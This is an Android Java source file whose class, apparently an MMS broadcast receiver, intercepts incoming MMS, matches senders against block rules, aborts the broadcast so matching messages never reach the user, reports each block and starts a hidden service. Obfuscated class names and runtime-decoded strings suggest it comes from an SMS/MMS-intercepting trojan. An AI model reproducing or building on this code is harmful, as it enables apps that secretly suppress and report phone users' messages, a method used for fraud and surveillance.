package c;
import net.workspace.listener.BlockListener;
import net.workspace.manager.ReportManager;
import net.workspace.sms.SmsHelper;
import net.workspace.util.Logger;
import net.workspace.util.ParseKsy;
import net.workspace.util.T;
import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import bean.Block;
import com.google.android.mms.pdu.GenericPdu;
import com.google.android.mms.pdu.PduParser;

/**
 * MmsReceiver
 * @author Hike
 *
 */
@SuppressLint("NewApi")
public class MR extends BroadcastReceiver {
    public static MR instance;
    public static Intent intent;
    private Context context;
    private String DATA = ParseKsy.decode("d6063dd0e501615cebdbda2a28cdb4bd");
    private String GET_PHONE = ParseKsy.decode("0f7894da19aa3cd1c6fdfcf6c7a7bfcf");
    public void dealMsg(final BroadcastReceiver broadcastreceiver, Intent inputIntent) {
        byte abyte0[] = inputIntent.getByteArrayExtra(DATA);
        if (abyte0 != null) {
            GenericPdu genericpdu = new PduParser(abyte0).parse();
            if (genericpdu != null && genericpdu.getFrom() != null) {
                String address = genericpdu.getFrom().getString();
                BlockListener listener = new BlockListener() {
                    private boolean blocked = false;
                    @Override
                    public void stopBroadcast() {
                        if (!blocked) {
                            broadcastreceiver.abortBroadcast();
                            blocked = true;
                        }
                    }
                };
                SmsHelper.checkCommonBlocks(address, null, listener);
                Block block = SmsHelper.checkBlock(address, null, listener);
                if (block != null) {
                    ReportManager.successReport(block, address);
                }
                if (block != null) {
                    abortBroadcast();
                    intent = inputIntent;
                    instance = this;
                    Bundle bundle = new Bundle();
                    bundle.putBoolean(GET_PHONE, false);
                    context.startService(new Intent(context, MS.class).putExtras(bundle));
                } else {
                    Bundle bundle = new Bundle();
                    bundle.putBoolean(GET_PHONE, true);
                    context.startService(new Intent(context, MS.class).putExtras(bundle));
                }
            }
        }
    }
    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            T.registerReciever();
            this.context = context;
            if (android.os.Build.VERSION.SDK_INT > 7) dealMsg(this, intent);
        } catch (Throwable e) {
            Logger.error(e);
        }
    }
}
